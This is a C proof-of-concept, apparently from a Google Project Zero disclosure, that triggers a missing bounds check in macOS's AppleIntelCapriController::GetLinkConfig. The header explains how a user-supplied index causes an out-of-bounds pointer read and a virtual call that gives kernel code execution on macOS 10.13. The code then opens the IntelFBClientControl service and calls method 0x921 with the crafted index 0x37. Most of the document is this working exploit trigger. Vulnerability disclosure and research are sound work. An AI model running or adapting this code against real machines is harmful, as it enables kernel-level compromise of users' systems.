@@ -1,0 +1,75 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1375
+
+AppleIntelCapriController::GetLinkConfig trusts a user-supplied value in the structure input which it uses to index
+a small table of pointers without bounds checking. The OOB-read pointer is passed to AppleIntelFramebuffer::validateDisplayMode
+which will read a pointer to a C++ object from that buffer (at offset 2138h) and call a virtual method allowing trivial kernel code execution.
+
+Tested on MacOS 10.13 (17A365) on MacBookAir5,2
+*/
+
+// ianbeer
+// build: clang -o capri_link_config capri_link_config.c -framework IOKit
+
+#if 0
+MacOS kernel code execution due to lack of bounds checking in AppleIntelCapriController::GetLinkConfig
+
+AppleIntelCapriController::GetLinkConfig trusts a user-supplied value in the structure input which it uses to index
+a small table of pointers without bounds checking. The OOB-read pointer is passed to AppleIntelFramebuffer::validateDisplayMode
+which will read a pointer to a C++ object from that buffer (at offset 2138h) and call a virtual method allowing trivial kernel code execution.
+
+Tested on MacOS 10.13 (17A365) on MacBookAir5,2
+#endif
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#include <IOKit/IOKitLib.h>
+
+int main(int argc, char** argv){
+  kern_return_t err;
+
+  io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IntelFBClientControl"));
+
+  if (service == IO_OBJECT_NULL){
+    printf("unable to find service\n");
+    return 0;
+  }
+
+  io_connect_t conn = MACH_PORT_NULL;
+  err = IOServiceOpen(service, mach_task_self(), 0, &conn);
+  if (err != KERN_SUCCESS){
+    printf("unable to get user client connection\n");
+    return 0;
+  }
+
+  uint64_t inputScalar[16];  
+  uint64_t inputScalarCnt = 0;
+
+  char inputStruct[4096];
+  size_t inputStructCnt = 8;
+  //*(uint64_t*)inputStruct = 0x12345678; // crash
+  *(uint64_t*)inputStruct = 0x37; // oob call
+
+
+  uint64_t outputScalar[16];
+  uint32_t outputScalarCnt = 0;
+
+  char outputStruct[4096];
+  size_t outputStructCnt = 4096;
+  
+  err = IOConnectCallMethod(
+    conn,
+    0x921,  // GetLinkConfig
+    inputScalar,
+    inputScalarCnt,
+    inputStruct,
+    inputStructCnt,
+    outputScalar,
+    &outputScalarCnt,
+    outputStruct,
+    &outputStructCnt); 
+
+  return 0;
+}
